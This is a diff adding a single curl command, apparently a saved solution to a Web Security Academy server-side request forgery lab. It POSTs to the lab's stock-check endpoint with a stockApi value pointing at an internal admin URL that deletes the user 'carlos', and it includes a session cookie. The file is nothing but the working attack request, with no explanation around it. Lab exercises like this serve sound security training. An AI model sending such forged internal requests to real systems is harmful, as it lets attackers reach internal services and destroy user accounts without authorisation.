@@ -1,0 +1,20 @@
+curl 'https://0ad1009304d8dc7c823ccade009a00bd.web-security-academy.net/product/stock' \
+  --compressed \
+  -X POST \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
+  -H 'Referer: https://0ad1009304d8dc7c823ccade009a00bd.web-security-academy.net/product?productId=1' \
+  -H 'Origin: https://0ad1009304d8dc7c823ccade009a00bd.web-security-academy.net' \
+  -H 'Sec-GPC: 1' \
+  -H 'Connection: keep-alive' \
+  -H 'Cookie: session=vgjX6Ei30obyr4Vv9rjchBmLquiXDdlL' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Sec-Fetch-Mode: no-cors' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Priority: u=0' \
+  -H 'Pragma: no-cache' \
+  -H 'Cache-Control: no-cache' \
+  --data-raw 'stockApi=http://192.168.0.205:8080/admin/delete?username=carlos'
